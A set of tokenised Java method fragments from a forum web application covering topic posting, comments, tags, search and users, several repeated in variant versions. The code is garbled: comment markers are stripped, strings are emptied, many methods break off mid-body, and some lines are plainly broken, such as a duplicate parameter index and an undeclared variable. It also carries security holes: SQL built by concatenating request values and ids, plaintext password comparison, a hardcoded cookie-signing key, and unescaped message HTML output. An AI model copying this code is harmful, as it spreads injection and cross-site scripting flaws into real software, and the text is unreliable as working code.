public int addTopicFromPreview ( Connection db , Template tmpl , HttpServletRequest request , String previewImagePath , User user ) throws SQLException , UtilException , IOException , BadImageException , InterruptedException , DuplicationException , BadGroupException { ScreenshotProcessor screenshot = null ; Group group = new Group ( db , guid ) ; if ( group . isImagePostAllowed ( ) ) { screenshot = new ScreenshotProcessor ( previewImagePath ) ; } Statement st = db . createStatement ( ) ; DupeProtector . getInstance ( ) . checkDuplication ( request . getRemoteAddr ( ) ) ; allocation MSGID ResultSet rs = st.executeQuery("select nextval('s_msgid') as msgid"); rs.next(); int msgid = rs.getInt("msgid"); if (group.isImagePostAllowed()) { screenshot.copyScreenshot(tmpl, msgid); url = "gallery/" + screenshot.getMainFile().getName(); linktext = "gallery/" + screenshot.getIconFile().getName(); } PreparedStatement pst = db.prepareStatement("INSERT INTO topics (postip, groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id) VALUES ('" + request.getRemoteAddr() + "',?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?))"); pst.setString(1, request.getRemoteAddr()); pst.setInt(1, group.getId()); pst.setInt(2, user.getId()); pst.setString(3, title); pst.setString(4, url); pst.setInt(5, msgid); pst.setString(6, linktext); pst.setString(7, request.getHeader("User-Agent")); pst.executeUpdate(); pst.close(); insert message text PreparedStatement pstMsgbase = db.prepareStatement("INSERT INTO msgbase (id, message) values (?,?)"); pstMsgbase.setLong(1, msgid); pstMsgbase.setString(2, message); pstMsgbase.executeUpdate(); pstMsgbase.close(); String logmessage = " " + msgid + ' ' + LorHttpUtils.getRequestIP(request); logger.info(logmessage); rs.close(); st.close(); return msgid; } 
public void validate ( Group group , User user ) throws BadInputException , AccessViolationException { if ( " " . equals ( title . trim ( ) ) ) { throw new BadInputException ( " " ) ; } if ( guid < 1 ) { throw new BadInputException ( " Bad group id " ) ; } if ( " pre " . equals ( mode ) & & ! group . isPreformatAllowed ( ) ) { throw new AccessViolationException ( " " ) ; } if ( ( " ntobrq " . equals ( mode ) | | " ntobr " . equals ( mode ) | | " tex " . equals ( mode ) | | " quot " . equals ( mode ) ) & & group . isLineOnly ( ) ) { throw new AccessViolationException ( " " ) ; } String message = processMessage ( group ) ; if ( user . isAnonymous ( ) ) { if ( message . length ( ) > 4096 ) { throw new BadInputException ( " " ) ; } } else { if ( message . length ( ) > 8192 ) { throw new BadInputException ( " " ) ; } } if ( ! group . isTopicPostingAllowed ( user ) ) { throw new AccessViolationException ( " " ) ; 
public User validateAndGetUser ( HttpSession session , Connection db ) throws BadInputException , UserNotFoundException , SQLException , BadPasswordException , AccessViolationException { User user ; if ( ! Template . isSessionAuthorized ( session ) ) { if ( nick = = null ) { throw new BadInputException ( " " ) ; } user = User . getUser ( db , nick ) ; user . checkPassword ( password ) ; } else { user = User . getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } user . checkBlocked ( ) ; if ( user . isAnonymous ( ) ) { if ( msg ! = null & & msg . length ( ) > 4096 ) { throw new BadInputException ( " " ) ; } } else { if ( msg ! = null & & msg . length ( ) > 8192 ) { throw new BadInputException ( " " ) ; } } return user ; } 
public static List < Group > getGroups ( Connection db , Section section ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT sections.moderate, sections.preformat, imagepost, vote, section, havelink, linktext, sections.name as sname, title, image, restrict_topics, restrict_comments, sections.browsable,stat1,stat2,stat3,groups.id,groups.info FROM groups, sections WHERE sections.id= " + section . getId ( ) + " AND groups.section=sections.id ORDER BY id " ) ; List < Group > list = new ArrayList < Group > ( ) ; while ( rs . next ( ) ) { Group group = new Group ( rs ) ; list . add ( group ) ; } return list ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; preformat = rs . getBoolean ( " preformat " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public int addTopicFromPreview ( Connection db , Template tmpl , HttpServletRequest request , String previewImagePath , User user ) throws SQLException , UtilException , IOException , BadImageException , InterruptedException , DuplicationException , BadGroupException { ScreenshotProcessor screenshot = null ; Group group = new Group ( db , guid ) ; if ( group . isImagePostAllowed ( ) ) { screenshot = new ScreenshotProcessor ( previewImagePath ) ; } Statement st = db . createStatement ( ) ; DupeProtector . getInstance ( ) . checkDuplication ( request . getRemoteAddr ( ) ) ; allocation MSGID ResultSet rs = st.executeQuery("select nextval('s_msgid') as msgid"); rs.next(); int msgid = rs.getInt("msgid"); if (group.isImagePostAllowed()) { screenshot.copyScreenshot(tmpl, msgid); url = "gallery/" + screenshot.getMainFile().getName(); linktext = "gallery/" + screenshot.getIconFile().getName(); } PreparedStatement pst = db.prepareStatement("INSERT INTO topics (postip, groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id) VALUES ('" + request.getRemoteAddr() + "',?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?))"); pst.setString(1, request.getRemoteAddr()); pst.setInt(1, group.getId()); pst.setInt(2, user.getId()); pst.setString(3, title); pst.setString(4, url); pst.setInt(5, msgid); pst.setString(6, linktext); pst.setString(7, request.getHeader("User-Agent")); pst.executeUpdate(); pst.close(); insert message text PreparedStatement pstMsgbase = db.prepareStatement("INSERT INTO msgbase (id, message, bbcode) values (?,?, ?)"); pstMsgbase.setLong(1, msgid); pstMsgbase.setString(2, message); pstMsgbase.setBoolean(3, lorcode); pstMsgbase.executeUpdate(); pstMsgbase.close(); String logmessage = " " + msgid + ' ' + LorHttpUtils.getRequestIP(request); logger.info(logmessage); rs.close(); st.close(); return msgid; } 
public String getProcessedMessage ( Connection db ) throws SQLException { if ( lorcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( " ) " ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . toString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public void validate ( Group group , User user ) throws BadInputException , AccessViolationException { if ( " " . equals ( title . trim ( ) ) ) { throw new BadInputException ( " " ) ; } if ( guid < 1 ) { throw new BadInputException ( " Bad group id " ) ; } if ( " pre " . equals ( mode ) & & ! group . isPreformatAllowed ( ) ) { throw new AccessViolationException ( " " ) ; } String message = processMessage ( group ) ; if ( user . isAnonymous ( ) ) { if ( message . length ( ) > 4096 ) { throw new BadInputException ( " " ) ; } } else { if ( message . length ( ) > 8192 ) { throw new BadInputException ( " " ) ; } } if ( ! group . isTopicPostingAllowed ( user ) ) { throw new AccessViolationException ( " " ) ; 
public String processMessage ( Group group ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public static Map < String , Integer > getAllTags ( Connection con ) throws SQLException { Map < String , Integer > map = new TreeMap < String , Integer > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values WHERE counter>0 " ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { map . put ( rs . getString ( " value " ) , rs . getInt ( " counter " ) ) ; } return map ; } 
public static List < String > getMessageTags ( Connection con , int msgid ) throws SQLException { return new Tags ( con , msgid ) . getTags ( ) ; } 
public static void checkTag ( String tag ) throws UserErrorException { : , , , <> if (!tagRE.isMatch(tag)) { throw new UserErrorException("Invalid tag: '"+tag+ '\''); 
public static void updateTags ( Connection con , int msgid , List < String > tagList ) throws SQLException { List < String > oldTags = getMessageTags ( con , msgid ) ; PreparedStatement insertStatement = con . prepareStatement ( " INSERT INTO tags VALUES(?,?) " ) ; PreparedStatement deleteStatement = con . prepareStatement ( " DELETE FROM tags WHERE msgid=? and tagid=? " ) ; insertStatement . setInt ( 1 , msgid ) ; deleteStatement . setInt ( 1 , msgid ) ; for ( String tag : tagList ) { if ( ! oldTags . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; insertStatement . setInt ( 2 , id ) ; insertStatement . executeUpdate ( ) ; } } for ( String tag : oldTags ) { if ( ! tagList . contains ( tag ) ) { int id = getOrCreateTag ( con , tag ) ; deleteStatement . setInt ( 2 , id ) ; deleteStatement . executeUpdate ( ) ; } } insertStatement . close ( ) ; deleteStatement . close ( ) ; } 
public static String getTagLinks ( Connection con , int msgid ) throws SQLException { StringBuilder buf = new StringBuilder ( ) ; Tags tags = new Tags ( con , msgid ) ; List < String > mtags = tags . getTags ( ) ; if ( mtags . isEmpty ( ) ) { return " " ; } for ( String mtag : mtags ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } try { buf . append ( " <a href= \" view-news.jsp?section=1&amp;tag= " ) . append ( URLEncoder . encode ( mtag , " UTF-8 " ) ) . append ( " \" > " ) . append ( mtag ) . append ( " </a> " ) ; } catch ( UnsupportedEncodingException e ) { throw new RuntimeException ( e ) ; } } return buf . toString ( ) ; } 
private void init ( ResultSet rs ) throws SQLException { id = rs . getInt ( " id " ) ; moderate = rs . getBoolean ( " moderate " ) ; imagepost = rs . getBoolean ( " imagepost " ) ; votepoll = rs . getBoolean ( " vote " ) ; section = rs . getInt ( " section " ) ; havelink = rs . getBoolean ( " havelink " ) ; linktext = rs . getString ( " linktext " ) ; sectionName = rs . getString ( " sname " ) ; title = rs . getString ( " title " ) ; image = rs . getString ( " image " ) ; restrictTopics = rs . getInt ( " restrict_topics " ) ; restrictComments = rs . getInt ( " restrict_comments " ) ; browsable = rs . getBoolean ( " browsable " ) ; stat1 = rs . getInt ( " stat1 " ) ; stat2 = rs . getInt ( " stat2 " ) ; stat3 = rs . getInt ( " stat3 " ) ; info = rs . getString ( " info " ) ; } 
public void validate ( Group group , User user ) throws BadInputException , AccessViolationException { if ( " " . equals ( title . trim ( ) ) ) { throw new BadInputException ( " " ) ; } if ( guid < 1 ) { throw new BadInputException ( " Bad group id " ) ; } String message = processMessage ( group ) ; if ( user . isAnonymous ( ) ) { if ( message . length ( ) > 4096 ) { throw new BadInputException ( " " ) ; } } else { if ( message . length ( ) > 8192 ) { throw new BadInputException ( " " ) ; } } if ( ! group . isTopicPostingAllowed ( user ) ) { throw new AccessViolationException ( " " ) ; 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder buf = new StringBuilder ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( tag ! = null & & ! " " . equals ( tag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? AND counter>0 " ) ; pst . setString ( 1 , tag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int tagid = rs . getInt ( " id " ) ; if ( tagid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( tagid ) . append ( ')' ) ; } } else { throw new UserErrorException ( " Tag not found " ) ; } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " topics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, bbcode, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . toString ( ) + ' ' + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . toString ( ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = " ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE " ; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(new Long(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any Cookie sess = new Cookie("JSESSIONID", session.getId()); int maxAge = (int)(System.currentTimeMillis()/1000)+session.getMaxInactiveInterval(); sess.setMaxAge(maxAge); sess.setPath("/wiki"); response.addCookie(sess); } 
private void updateCache ( Connection db ) throws SQLException { try { getUser ( db , id ) ; 
public boolean isCorrector ( ) { return corrector ; } 
public String deleteReplys ( int msgid , User user , boolean score ) throws SQLException , ScriptErrorException { return deleteReplys ( msgid , user , score , 0 ) ; } 
private String deleteReplys ( int msgid , User user , boolean score , int depth ) throws SQLException , ScriptErrorException { List < Integer > replys = getReplys ( msgid ) ; StringBuilder out = new StringBuilder ( ) ; for ( Integer r : replys ) { out . append ( deleteReplys ( r , user , score , depth + 1 ) ) ; out . append ( " " ) . append ( r ) . append ( " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . toString ( ) ; } 
public List < Integer > getReplys ( int msgid ) throws SQLException { List < Integer > replys = new ArrayList < Integer > ( ) ; replysForComment . setInt ( 1 , msgid ) ; ResultSet rs = replysForComment . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( r ) ; } rs . close ( ) ; return replys ; } 
public void close ( ) throws SQLException { deleteComment . close ( ) ; insertDelinfo . close ( ) ; replysForComment . close ( ) ; } 
public String deleteAllComments ( Connection db , User moderator ) throws SQLException , ScriptErrorException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; try { Delete user topics PreparedStatement lock = db.prepareStatement("SELECT id FROM topics WHERE userid=? AND not deleted FOR UPDATE"); PreparedStatement st1 = db.prepareStatement("UPDATE topics SET deleted='t',sticky='f' WHERE id=?"); PreparedStatement st2 = db.prepareStatement("INSERT INTO del_info (msgid, delby, reason) values(?,?,?)"); lock.setInt(1, id); st2.setInt(2,moderator.getId()); st2.setString(3,": "); ResultSet lockResult = lock.executeQuery(); lock another delete on this row while (lockResult.next()) { int mid = lockResult.getInt("id"); st1.setInt(1,mid); st2.setInt(1,mid); st1.executeUpdate(); st2.executeUpdate(); } st1.close(); st2.close(); lockResult.close(); lock.close(); Delete user comments deleter = new CommentDeleter(db); st = db.createStatement(); rs = st.executeQuery("SELECT id FROM comments WHERE userid="+id+" AND not deleted ORDER BY id DESC FOR update"); while(rs.next()) { int msgid = rs.getInt("id"); out.append(" #").append(msgid).append("<br>"); out.append(deleter.deleteReplys(msgid, moderator, true)); out.append(deleter.deleteComment(msgid, "4.7 Flood (auto)", moderator, -20)); out.append("<br>"); } } finally { if (deleter!=null) { deleter.close(); } if (rs!=null) { rs.close(); } if (st!=null) { st.close(); } } return out.toString(); } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } if ( canModerate ( ) ) { return false ; } return ( maxScore < BLOCK_MAX_SCORE ) & & ( score < BLOCK_SCORE ) ; } 
public String show ( Connection db ) throws IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT qq.id, title, postdate, section, topic, userid, rank, message,bbcode FROM ( " + " SELECT " + " msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { try { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { throw new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100) as qq, plainto_tsquery(?) as q, msgbase WHERE msgbase.id=qq.id " ) ; if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } PreparedStatement pst = null ; try { pst = db . prepareStatement ( select . toString ( ) ) ; 
private String printResults ( Connection db , ResultSet rs ) throws SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String title = rs . getString ( " title " ) ; int topic = rs . getInt ( " topic " ) ; int id = rs . getInt ( " id " ) ; String message = rs . getString ( " message " ) ; boolean lorcode = rs . getBoolean ( " bbcode " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( topic = = 0 ) { url = " view-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + topic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( title ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) ; if ( lorcode ) { BBCodeProcessor proc = new BBCodeProcessor ( ) ; out . append ( proc . preparePostText ( db , message ) ) ; } else { out . append ( message ) ; } out . append ( " </p> " ) ; out . append ( " <div class=sign> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . toString ( ) ; } 
public static String showComments ( Connection db , User user ) throws SQLException { return showComments ( db , user , 0 , 0 ) ; } 
public static String showComments ( Connection db , User user , int offset , int limit ) throws SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; try { if ( limit < 1 | | offset < 0 ) { tpst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; } else { tpst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " topics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; } pst . setString ( 1 , user . getNick ( ) ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " topicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " title " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . toString ( ) ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , String nick ) throws SQLException , UserNotFoundException { Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentViewer . FILTER_IGNORED ) > 0 & & nick ! = null & & ! " " . equals ( nick ) ) { Map < Integer , String > ignoreList = IgnoreList . getIgnoreListHash ( db , nick ) ; if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public String show ( boolean reverse , int offset , int limit , Set < Integer > hideSet ) throws IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . toString ( ) ; } 
public static int parseFilterChain ( String filter ) { if ( " list " . equals ( filter ) ) { return FILTER_IGNORED ; } if ( " anonymous " . equals ( filter ) ) { return FILTER_ANONYMOUS ; } if ( " listanon " . equals ( filter ) ) { return FILTER_IGNORED + FILTER_ANONYMOUS ; } return FILTER_NONE ; } 
public static Set < Integer > makeHideSet ( Connection db , CommentList comments , int filterChain , String nick ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentViewer . FILTER_NONE ) { return null ; } Set < Integer > hideSet = new HashSet < Integer > ( ) ; if ( ( filterChain & CommentViewer . FILTER_IGNORED ) > 0 & & nick ! = null & & ! " " . equals ( nick ) ) { Map < Integer , String > ignoreList = IgnoreList . getIgnoreListHash ( db , nick ) ; if ( ignoreList ! = null & & ! ignoreList . isEmpty ( ) ) { comments . root . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
public String show ( int offset , int limit , Set < Integer > hideSet ) throws IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , offset , limit , hideSet ) ; return buf . toString ( ) ; } 
public String showSubtree ( int parentId ) throws IOException , UtilException , MessageNotFoundException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { throw new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , 0 , 0 , null ) ; return buf . toString ( ) ; } 
public Message getNextMessage ( Connection db ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT min(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db ) throws SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT max(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } try { ResultSet rs = pst . executeQuery ( ) ; 
public int saveNewMessage ( Connection db , String remoteAddr , String userAgent ) throws SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; try { allocation MSGID 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( ! isTopicsRestricted ( ) ) { return true ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = - 1 ) { return currentUser . canModerate ( ) ; 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! isCommentsRestricted ( ) ) { return true ; } if ( restrictComments = = - 1 ) { return currentUser . canModerate ( ) ; } return currentUser . getScore ( ) > = restrictComments ; } 
public String preparePostText ( Connection db , String texto ) throws SQLException { texto = HTMLFormatter . htmlSpecialChars ( texto ) ; return process ( db , texto ) . toString ( ) ; } 
public int compare ( BBChunk o1 , BBChunk o2 ) { return ( o1 . start - o2 . start ) ; } 
public void testList ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , LIST_TEST ) ; assertEquals ( LIST_RESULT , result ) ; } 
public void testBadList ( ) throws BadURLException , SQLException { BBCodeProcessor proc = new BBCodeProcessor ( ) ; String result = proc . preparePostText ( null , BADLIST_TEST ) ; assertEquals ( BADLIST_RESULT , result ) ; } 
public boolean matchPassword ( String password ) { return password . equals ( this . password ) ; } 
public static User getUser ( Connection con , String name ) throws SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . set ( cacheId , user , new Date ( new Date ( ) . getTime ( ) + CACHE_MILLIS ) ) ; return user ; } 
public boolean isAnonymousScore ( ) { return anonymous | | blocked | | score < ANONYMOUS_LEVEL_SCORE ; } 
